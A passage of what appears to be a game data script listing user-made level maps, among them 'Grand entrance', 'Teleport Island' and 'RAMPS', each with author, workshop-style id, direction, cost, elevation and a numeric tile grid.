,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,19,19,0,0,24,24,0,0,5,5,0,0,9,9,0,0,14,14,0,0,18,18,0,0,24,24,0,0,5,5,6,7,8,8,0,0,14,14,15,16,17,17,0,0,24,24,0,0,5,5,6,7,8,8,0,0,14,14,15,16,17,17,0,0,2,2,0,0]});
maps.push({name="Empty Hall",author="TF2 Pencil",id="#1662316149",direction="forward",cost=245,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,97,10,30,0,0,30,0,30,0,30,0,0,0,0,0,0,9,9,0,0,10,10,0,0,0,0,0,0,0,0,0,0,1,1,1,1,9,9,0,0,10,10,1,1,1,1,1,1,110,110,110,110,1,1,109,109,109,109,0,0,110,110,110,110,110,110,96,110,110,110,110,110,109,95,109,109,109,109,0,0,110,110,110,110,110,110,96,110,110,110,110,110,109,95,109,109,109,109,0,0,10,10,1,1,1,1,1,1,110,110,110,110,1,1,109,109,109,109,0,0,3,3,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,115,116,117,118,119,98,119,118,117,116,115,115,115,0,0,0,114,114,114,114,115,116,117,118,119,98,119,118,117,116,115,115,115,0,0,0,92,0,1,1,1,1,1,1,1,1,1,1,1,1,115,115,115,0,0,0,0,0,1,15,0,35,0,0,0,35,0,0,0,0,0,115,0,0,0,0,0,0,1,102,0,0,0,35,0,0,0,35,115,115,115,115,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,101,101,101,0,0,0,34,34,0,0,0,0,0,0,34,99,1,100,0,0,0,115,115,0,0,0,34,34,92,0,0,0,0,0,34,34,1,43,41,39,37,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,1,43,41,39,37,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,2,2,0,0]});
maps.push({name="Top Floor To Trigger",author="TF2 Pencil",id="#1662316298",direction="forward",cost=217,elevation=13,map=[2,2,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,1,132,9,9,49,49,49,49,49,50,51,52,53,54,54,0,8,8,0,0,1,9,4,9,49,49,49,49,49,50,51,52,53,54,54,0,8,8,0,0,1,15,15,15,15,0,0,0,0,0,0,0,0,53,53,0,8,8,0,0,1,132,15,15,1,1,0,0,0,0,0,0,0,52,52,0,8,8,8,0,1,1,1,1,1,0,0,0,0,0,0,0,0,51,51,0,8,131,8,0,0,54,54,54,53,52,51,50,49,48,47,48,49,50,50,0,8,8,8,0,0,54,54,54,53,52,51,50,49,48,47,48,49,50,50,0,0,40,40,40,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,40,40,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,96,96,96,96,0,0,52,52,53,54,55,56,57,58,58,0,0,0,0,0,0,14,14,0,0,0,52,52,53,54,55,56,57,58,58,0,0,40,40,0,40,54,54,54,53,52,52,52,0,0,0,0,0,59,59,0,0,0,0,0,40,54,54,54,53,52,52,52,0,0,0,0,0,60,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,61,61,0,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,62,0,0,41,0,0,0,21,21,61,61,61,61,60,59,58,59,60,61,62,62,0,0,42,43,43,0,21,21,61,61,61,61,60,59,58,59,60,61,62,62,0,0,0,100,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bumpy Platforms",author="TF2 Pencil",id="#1662316388",direction="forward",cost=156,elevation=1,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,35,132,134,35,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,36,36,36,36,0,0,0,0,0,0,0,0,0,33,33,33,33,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,33,33,33,33,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,36,36,36,36,0,0,0,0,0,0,0,0,0,33,33,33,33,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,33,33,33,33,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,36,36,36,36,0,0,0,0,0,0,0,0,0,33,33,33,33,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,33,131,133,33,0,0,0,35,2,2,35,0,0]});
maps.push({name="Chance to go fast",author="TF2 Pencil",id="#1662334196",direction="forward",cost=228,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,12,12,12,12,12,0,0,0,1,20,20,1,0,0,0,12,12,12,12,12,12,132,137,134,12,0,0,0,1,20,20,1,0,0,0,12,134,137,132,12,12,139,12,139,12,0,0,0,1,20,20,1,0,0,0,12,139,12,139,12,12,134,137,132,12,0,0,0,1,20,20,1,0,0,0,12,132,137,134,12,12,12,12,12,12,0,0,0,1,20,20,1,0,0,0,12,12,12,12,12,12,12,0,0,0,0,0,0,1,20,20,1,0,0,0,0,0,0,12,12,12,12,0,0,0,0,1,1,1,20,20,1,1,1,0,0,0,0,12,12,0,0,0,0,0,0,1,20,20,20,20,20,20,1,0,0,0,0,0,0,12,12,0,0,0,0,1,20,131,133,136,138,20,1,0,0,0,0,12,12,12,12,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,0,12,12,0,0,0,0,0,0,0,20,132,134,137,139,20,0,0,0,0,0,0,0,12,12,0,0,0,0,0,20,20,20,20,20,20,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,12,12,12,12,13,14,15,16,17,18,19,20,20,19,18,17,16,15,14,13,12,12,12,12,13,14,15,16,17,18,19,20,20,19,18,17,16,15,14,13,12,12,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Not Really Gravity",author="TF2 Pencil",id="#1662336080",direction="forward",cost=424,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,129,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,20,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,129,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,20,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,129,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,20,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,129,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,20,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,129,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,20,20,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="Like to go up",author="TF2 Pencil",id="#1662351415",direction="forward",cost=208,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,44,44,44,44,43,42,41,40,39,38,37,36,35,34,34,0,0,6,6,0,44,44,44,0,0,0,0,0,0,0,0,0,0,33,33,0,0,6,6,9,9,9,9,1,1,1,1,1,0,0,0,0,0,32,32,0,0,0,0,9,66,66,66,66,9,15,132,1,0,0,0,0,0,31,31,0,0,26,26,9,66,66,66,66,9,15,15,1,0,0,33,33,0,30,30,0,0,26,26,9,66,66,66,66,9,49,49,1,0,0,33,33,0,30,30,0,0,27,27,9,9,9,9,9,9,49,49,1,0,0,32,32,0,0,0,0,0,28,28,0,0,0,0,0,0,50,50,1,0,0,31,31,0,0,0,0,0,29,29,0,0,0,0,0,0,51,51,1,0,0,30,30,0,0,0,0,0,0,0,57,57,56,55,54,53,52,52,1,0,0,29,29,0,0,0,0,0,29,29,57,57,56,55,54,53,52,52,1,0,0,29,29,0,32,31,30,29,29,29,58,58,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,0,59,59,0,0,0,0,0,0,0,0,0,0,39,39,39,0,0,0,30,0,60,60,20,20,0,0,0,0,0,0,0,0,39,131,39,0,0,0,31,0,0,0,0,20,0,0,34,34,35,36,37,38,39,39,39,0,0,0,32,0,0,0,0,20,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,34,33,32,0,0,32,31,30,29,0,0,29,29,0,20,20,20,20,0,0,34,33,32,0,0,32,31,30,29,0,0,29,29,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Grand entrance",author="Luffaren",id="#1662353625",direction="forward",cost=456,elevation=16,map=[0,0,0,5,5,5,5,5,5,2,2,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,94,5,9,6,6,6,6,6,6,6,6,9,5,94,5,5,0,0,5,94,5,5,7,7,7,7,7,7,7,7,7,7,5,5,94,5,0,0,5,5,5,5,11,8,8,8,8,8,8,8,8,11,5,5,5,5,0,0,90,5,5,90,9,9,9,9,9,9,9,9,9,9,90,5,5,90,0,0,5,65,65,5,13,10,10,10,10,10,10,10,10,13,5,65,65,5,0,0,5,65,65,5,11,11,11,11,11,11,11,11,11,11,5,65,65,5,0,0,5,65,65,5,15,12,12,12,12,12,12,12,12,15,5,65,65,5,0,67,65,65,65,5,13,13,13,13,13,13,13,13,13,13,5,65,65,65,67,67,65,65,65,5,17,14,14,14,14,14,14,14,14,17,5,65,65,65,67,67,65,65,65,5,15,15,15,15,15,15,15,15,15,15,5,65,65,65,67,67,65,65,65,5,19,16,16,16,16,16,16,16,16,19,5,65,65,65,67,67,65,65,65,5,17,17,17,17,17,17,17,17,17,17,5,65,65,65,67,67,65,65,65,5,21,18,18,18,18,18,18,18,18,21,5,65,65,65,67,5,5,5,5,5,19,19,19,19,19,19,19,19,19,19,5,5,5,5,5,5,3,93,93,24,23,20,20,20,20,20,20,20,20,23,24,93,93,3,5,1,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,1,1,1,90,21,21,21,24,90,21,21,21,21,90,24,21,21,21,90,1,1,0,1,1,1,1,1,1,1,24,2,2,24,1,1,1,1,1,1,1,0]});
maps.push({name="Square Cake",author="TF2 Pencil",id="#1662363422",direction="forward",cost=296,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,0,7,9,9,9,9,9,9,9,9,9,9,9,9,9,7,0,0,0,0,0,7,9,91,91,91,91,91,91,91,91,91,91,91,9,7,0,0,0,0,0,7,9,91,125,9,9,9,9,9,9,9,125,91,9,7,0,0,0,0,0,7,9,91,9,14,14,14,14,14,14,14,9,91,9,7,0,0,0,0,0,7,9,91,9,14,90,14,125,14,90,14,9,91,9,7,0,0,0,0,0,7,9,91,9,14,14,19,19,19,14,14,9,91,9,7,0,0,0,0,0,7,9,91,9,14,125,19,100,19,125,14,9,91,9,7,0,0,0,0,0,7,9,91,9,14,14,19,19,19,14,14,9,91,9,7,0,0,0,0,0,7,9,91,9,14,90,14,125,14,90,14,9,91,9,7,0,0,0,0,0,7,9,91,9,14,14,14,14,14,14,14,9,91,9,7,0,0,0,0,0,7,9,91,125,9,9,9,9,9,9,9,125,91,9,7,0,0,0,0,0,7,9,91,91,91,91,91,91,91,91,91,91,91,9,7,0,0,0,0,0,7,9,9,9,9,9,9,9,9,9,9,9,9,9,7,0,0,0,0,0,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Teleport Island",author="TF2 Pencil",id="#1662363458",direction="forward",cost=452,elevation=4,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,10,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,10,0,0,10,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,10,0,0,10,66,66,10,10,10,66,66,66,66,66,66,10,10,10,66,66,10,0,0,10,66,66,10,131,10,66,66,66,66,66,66,10,136,10,66,66,10,0,0,10,66,66,10,10,10,66,10,10,10,10,66,10,10,10,66,66,10,0,0,10,66,66,66,66,66,66,10,100,100,10,66,66,66,66,66,66,10,0,0,10,66,66,66,66,66,66,10,100,100,10,66,66,66,66,66,66,10,0,0,10,66,66,10,10,10,66,10,10,10,10,66,10,10,10,66,66,10,0,0,10,66,66,10,133,10,66,66,66,66,66,66,10,138,10,66,66,10,0,0,10,66,66,10,10,10,66,66,66,66,66,66,10,10,10,66,66,10,0,0,10,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,10,0,0,10,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,10,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,132,14,139,14,14,14,14,14,14,14,14,14,14,137,14,134,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Two Floors",author="TF2 Pencil",id="#1662363693",direction="forward",cost=291,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,97,36,50,50,50,50,50,50,50,50,0,0,0,125,10,1,1,1,0,0,36,36,50,50,50,50,50,50,50,50,0,0,0,50,50,1,102,110,0,0,0,0,10,10,0,0,0,0,50,50,0,0,0,50,50,1,110,110,0,0,36,96,96,96,96,0,0,0,50,50,50,50,50,50,50,1,74,74,0,0,0,0,50,50,0,0,0,0,50,50,50,50,50,50,50,1,110,74,0,0,36,0,50,50,0,0,0,0,0,0,0,0,0,0,0,1,74,74,0,0,0,0,50,50,1,1,1,1,1,1,1,1,1,1,1,1,110,110,0,0,0,0,50,50,50,50,50,50,110,10,98,10,110,110,110,110,110,110,0,0,0,0,50,50,50,50,50,50,110,10,98,10,110,110,110,110,110,110,0,0,0,1,1,1,1,1,1,36,1,1,1,1,1,1,1,1,111,111,0,0,0,1,99,36,36,0,0,36,36,36,36,36,36,36,36,1,112,112,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,98,98,1,113,113,0,0,0,16,66,66,103,42,42,42,41,40,39,38,37,36,36,1,114,114,0,0,0,16,66,66,1,1,1,1,1,1,1,1,1,1,1,1,115,115,0,0,0,16,16,16,56,56,56,56,56,56,56,56,56,116,101,101,116,116,0,0,0,104,16,16,56,56,56,56,56,56,56,56,56,116,101,101,116,116,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Digging Down",author="TF2 Pencil",id="#1662363799",direction="right",cost=362,elevation=-19,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,24,24,1,119,119,118,117,116,115,114,114,1,109,109,108,107,106,105,2,0,24,24,1,119,119,118,117,116,115,114,114,1,109,109,108,107,106,105,2,1,91,91,1,96,96,1,1,1,1,114,114,1,110,110,1,1,1,1,0,1,124,124,1,119,119,1,97,114,1,91,91,1,111,111,1,114,100,1,0,1,91,91,1,91,91,1,114,114,1,114,114,1,112,112,1,114,114,1,0,1,124,124,1,119,119,1,115,115,1,91,91,1,113,113,1,91,91,1,0,1,91,91,1,91,91,1,116,116,1,114,114,1,114,114,114,114,114,1,0,1,124,124,1,119,119,91,117,117,1,91,91,1,115,115,1,91,91,1,0,1,123,123,1,119,119,91,117,117,1,114,114,1,116,116,1,114,114,1,0,1,122,122,1,91,91,1,1,1,1,91,91,1,117,117,1,91,91,1,0,1,121,121,1,119,119,1,91,91,91,114,114,1,118,118,1,114,114,1,0,1,120,120,1,91,91,1,91,91,91,114,114,1,119,119,1,91,91,1,0,1,119,119,119,119,119,1,91,91,91,114,114,120,120,120,1,114,114,1,0,1,119,119,119,119,119,1,131,91,91,114,114,120,120,132,1,100,114,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Is there treasure",author="TF2 Pencil",id="#1662363848",direction="right",cost=298,elevation=-17,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,24,24,0,0,1,132,117,116,115,114,113,112,111,110,109,108,107,107,2,0,124,124,0,0,1,117,117,116,115,114,113,112,111,110,109,108,107,107,2,1,124,124,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,124,124,1,100,105,105,91,131,105,105,105,105,105,1,0,0,0,0,0,1,123,123,1,105,105,105,91,105,105,105,105,105,105,1,0,0,0,0,0,1,122,122,1,105,105,105,91,105,105,105,1,106,106,1,0,0,0,0,0,1,121,121,1,105,105,105,105,105,105,105,1,107,107,1,0,0,0,0,0,1,120,120,1,91,91,91,91,91,91,91,1,108,108,1,0,0,0,0,0,1,119,119,1,105,105,105,105,105,105,105,1,109,109,1,0,0,0,0,0,1,118,118,1,94,94,94,105,93,93,93,1,110,110,1,0,0,0,0,0,1,117,117,1,94,94,94,105,93,93,93,1,111,111,1,0,0,0,0,0,1,116,116,1,94,94,94,105,93,93,93,1,112,112,1,0,0,0,0,0,1,115,115,1,1,1,1,1,1,1,1,1,113,113,1,0,0,0,0,0,1,114,114,91,91,91,91,91,91,91,91,91,114,114,1,0,0,0,0,0,1,114,114,91,91,91,91,91,91,91,91,91,114,114,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Yellow Gman",author="Escalope",id="#1662366633",direction="left",cost=262,elevation=7,map=[0,0,0,0,0,0,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,0,0,0,1,25,25,26,25,25,25,25,25,25,25,1,0,0,0,0,0,0,0,1,27,27,28,27,28,26,26,26,26,26,26,1,0,0,0,0,0,0,0,1,29,29,36,36,36,36,36,27,27,27,27,29,1,0,0,0,0,0,0,1,31,35,35,36,35,35,35,36,36,36,36,31,1,0,0,0,0,0,0,1,33,35,35,35,35,35,35,35,35,35,35,33,1,0,0,0,0,0,0,1,35,37,35,35,35,35,35,35,35,35,35,1,0,0,0,0,0,0,0,1,37,35,26,35,35,35,35,35,35,35,35,1,0,0,0,0,0,0,0,1,35,26,25,26,31,35,35,35,35,36,36,1,0,0,0,0,0,0,1,33,33,25,93,25,25,31,27,25,26,26,36,1,0,0,0,0,0,0,1,31,37,27,25,27,29,33,27,28,94,26,34,1,0,0,0,0,0,0,1,32,35,33,27,33,32,35,33,30,26,31,29,1,0,0,0,0,0,0,1,34,35,35,35,32,35,37,31,27,30,31,1,0,0,0,0,0,0,0,1,33,33,35,35,37,35,37,29,30,31,31,1,0,0,0,0,0,0,0,0,1,33,35,33,25,25,27,27,31,30,29,1,0,0,0,0,0,0,0,1,42,29,34,34,32,26,28,30,28,31,1,0,0,0,0,0,0,0,1,1,40,29,29,34,34,26,30,28,28,31,1,0,0,0,0,0,2,1,32,34,38,31,29,27,29,29,26,25,29,1,0,0,0,0,0,0,2,32,34,34,36,30,31,31,31,27,27,29,31,1,0,0,0,0,0,0,35,31,30,32,34,32,34,36,31,29,29,31,1,0,0,0,0,0,0,0]});
maps.push({name="Flyover",author="sivi",id="#1662377968",direction="forward",cost=286,elevation=0,map=[0,0,0,0,0,0,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,94,5,5,5,5,3,19,1,0,0,0,0,0,0,0,0,0,0,0,1,65,90,5,5,90,65,128,1,0,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,0,0,0,0,0,0,0,0,0,1,18,129,65,88,5,5,88,65,1,0,0,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,1,0,0,0,0,0,0,0,0,0,0,1,65,90,5,5,90,65,128,17,1,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,1,0,0,0,0,0,0,0,0,1,16,129,65,88,5,5,88,65,1,0,0,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,1,0,0,0,0,0,0,0,0,0,0,1,65,90,5,5,90,65,128,15,1,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,1,0,0,0,0,0,0,0,0,1,14,129,65,88,5,5,88,65,1,0,0,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,1,0,0,0,0,0,0,0,0,0,0,1,65,90,5,5,90,65,128,13,1,0,0,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,1,1,1,1,0,0,0,0,0,0,1,12,129,65,88,5,5,88,65,1,11,11,93,1,0,0,0,0,0,0,1,1,1,65,5,5,5,5,65,1,11,100,94,1,0,0,0,0,0,0,0,0,1,65,90,5,5,90,65,11,11,11,93,1,0,0,0,0,0,0,0,0,1,1,1,2,2,1,1,1,1,1,1,1,0,0]});
maps.push({name="Three islands",author="Luffaren",id="#1662395515",direction="left",cost=329,elevation=19,map=[0,0,0,67,67,67,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,67,10,9,48,14,14,67,0,0,0,0,5,5,5,5,5,5,0,0,67,12,11,14,91,14,14,85,0,0,0,0,5,65,65,5,5,5,0,0,14,13,14,48,48,14,14,14,67,0,0,67,5,65,65,65,65,5,5,0,85,14,90,48,48,90,14,14,14,1,67,5,5,65,65,65,5,5,5,0,14,14,48,48,94,48,48,95,48,7,6,5,5,65,65,65,5,5,0,0,85,14,90,48,48,48,48,95,48,7,6,5,5,65,65,5,5,0,0,0,0,14,14,14,91,14,14,14,14,1,0,0,5,5,5,5,5,0,0,0,0,0,14,14,48,48,14,15,14,0,0,0,0,5,5,5,0,0,0,0,0,0,85,14,48,93,15,129,85,0,0,0,0,67,34,34,67,0,0,0,0,0,0,14,14,14,15,129,0,0,0,0,0,67,34,34,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,34,34,67,0,0,0,0,0,0,0,0,0,0,0,0,24,24,85,0,0,85,85,0,0,0,1,0,77,77,77,77,77,0,0,90,24,24,24,24,1,14,14,0,0,0,2,24,44,44,44,44,44,24,24,24,24,89,24,24,24,15,15,16,0,0,2,24,44,44,44,44,44,24,24,24,24,24,24,24,24,24,24,17,18,0,1,0,77,77,77,77,77,0,0,90,24,24,24,89,24,24,24,24,19,20,0,0,0,0,0,0,0,0,0,0,85,24,24,24,24,24,24,24,24,21,0,0,0,0,0,0,0,0,0,0,0,0,85,24,24,89,24,24,23,22,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0]});
maps.push({name="Choose Your Jumps",author="TF2 Pencil",id="#1662408189",direction="right",cost=221,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,2,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,8,2,0,8,8,1,1,1,1,1,1,1,1,1,1,1,1,1,1,8,8,0,0,8,8,28,0,0,28,0,0,28,0,0,28,0,0,28,0,8,8,0,0,8,8,28,0,0,28,0,0,28,0,0,28,0,0,28,0,8,8,0,0,8,8,1,1,1,1,1,1,1,1,1,1,1,1,1,1,8,8,0,0,8,8,108,0,108,0,108,0,108,0,108,0,108,0,108,0,8,8,0,0,8,8,108,0,108,0,108,0,108,0,108,0,108,0,108,0,8,8,0,0,8,8,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,96,0,0,8,8,48,0,48,0,48,0,48,0,48,0,48,0,48,0,96,96,0,0,8,8,0,48,0,48,0,48,0,48,0,48,0,48,0,48,96,96,0,0,8,8,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,96,0,0,8,8,129,0,0,0,0,8,8,8,8,8,8,8,8,8,96,96,0,0,8,8,129,0,0,0,0,8,8,8,8,8,8,8,8,8,96,96,0,0,8,8,1,1,1,1,1,1,1,1,1,1,1,1,1,1,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RAMPS",author="TF2 Pencil",id="#1662408274",direction="forward",cost=172,elevation=4,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,13,13,32,31,30,29,0,0,0,0,0,0,33,32,31,30,29,0,9,9,13,13,32,31,30,29,0,30,31,32,33,0,33,32,31,30,29,0,9,9,13,13,0,0,0,0,0,30,31,32,33,0,0,0,0,0,0,0,9,9,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,13,13,32,31,30,29,0,0,0,0,0,0,33,32,31,30,29,0,9,9,13,13,32,31,30,29,0,30,31,32,33,0,33,32,31,30,29,0,9,9,13,13,0,0,0,0,0,30,31,32,33,0,0,0,0,0,0,0,9,9,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,13,13,32,31,30,29,0,0,0,0,0,0,33,32,31,30,29,0,9,9,13,13,32,31,30,29,0,30,31,32,33,0,33,32,31,30,29,0,9,9,13,13,0,0,0,0,0,30,31,32,33,0,0,0,0,0,0,0,9,9,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,13,13,32,31,30,29,0,0,0,0,0,0,33,32,31,30,29,0,9,9,13,13,32,31,30,29,0,30,31,32,33,0,33,32,31,30,29,0,9,9,13,13,0,0,0,0,0,30,31,32,33,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
